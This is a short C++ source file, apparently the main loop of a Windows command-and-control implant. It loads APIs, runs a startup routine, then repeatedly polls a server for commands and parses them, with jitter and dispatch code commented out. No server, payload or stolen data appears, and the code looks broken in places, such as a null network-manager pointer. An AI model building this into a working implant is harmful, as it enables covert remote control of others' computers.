#include <windows.h>
#include <time.h>
#include "apiFunc.hpp"
#include "startup.hpp"
#include "networkManager.hpp"
#include "commands.hpp"

PAuthConfig AuthConf      = NULL;
//Network* g_NetworkManager = NULL;
PServerConfig ServerConf  = NULL;
PCOMMANDINFO CommandInfo = NULL;

int main(void) {
	
	
	
	if (!AllocateAndLoadNeeded()) {
		return 1;
	}
	
	
	*g_NetworkManager = Network();


	
	bool check = init();
	
	
	if (!check) {
		printf("Startup Failed\n");
		return 1;
	}
	
	
	
	char CommandBuf[1024];
	while (TRUE) {
		Sleep(3000);
		
		/*double jitterPercent = ServerConf->Jitter;
		double jitterRangeF = ServerConf->SleepTime * jitterPercent / 100.0;
		int JitterRange = (int)jitterRangeF;

		int randJitter = (rand() % (2 * JitterRange + 1)) - JitterRange;
		int finalTime = ServerConf->SleepTime + randJitter;
		*/
		
		if (!g_NetworkManager->GetCommand(CommandBuf, sizeof(CommandBuf))) {
			printf("network fail\n");
			continue;
		}


		if (!ParseCommand((BYTE*)CommandBuf)) {
			printf("COmmand Fail\n");
			continue;
		}


		//cmds.Dispatch(CommandInfo->commandCode, CommandInfo->commandID, CommandInfo->param, CommandInfo->param2);


		
		
	}
	

	



}